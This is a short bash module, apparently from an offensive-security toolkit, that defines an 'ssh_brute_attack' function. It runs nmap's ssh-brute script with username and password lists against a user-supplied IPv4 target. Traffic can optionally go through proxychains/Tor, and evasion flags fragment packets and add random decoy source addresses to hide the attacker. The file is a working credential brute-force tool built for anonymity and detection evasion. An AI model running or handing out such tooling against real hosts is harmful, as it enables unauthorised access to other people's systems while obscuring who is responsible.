#! /bin/bash

source ./assets/set_color.sh

source ./lib/scan/helpers/create_dir.sh
source ./lib/scan/helpers/inputs.sh
source ./lib/settings/services.sh
source ./lib/util/success_output.sh

source ./validators/ipv4_validator.sh


function ssh_brute_attack()
{
	services "SSH brute attack"

  proxychains_input
  if [[ $proxychains == [Yy] ]]; then
    is_tor="proxychains4"
  else
    is_tor=""
  fi

  dns_input

	ipv4_validator "$dns"
  if [ $? -ne 0 ]; then
    return 1
  fi

	debug_mode
	if [[ $debug == [Yy] ]]; then
		debug_flag="-d"
	else
		debug_flag=""
	fi

  dir_input
  create_dir "$dir_name/attacks/ssh_brute"


	$is_tor nmap -p22 --script=ssh-brute \
	 --script-args=userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s $debug_flag \
	 -f --send-eth -D RND:3 \
	 -oN "$HOME/$dir_name/attacks/ssh_brute/$dns.nmap" "$dns"

	success_output "$HOME/$dir_name/attacks/ssh_brute/$dns.nmap"
}
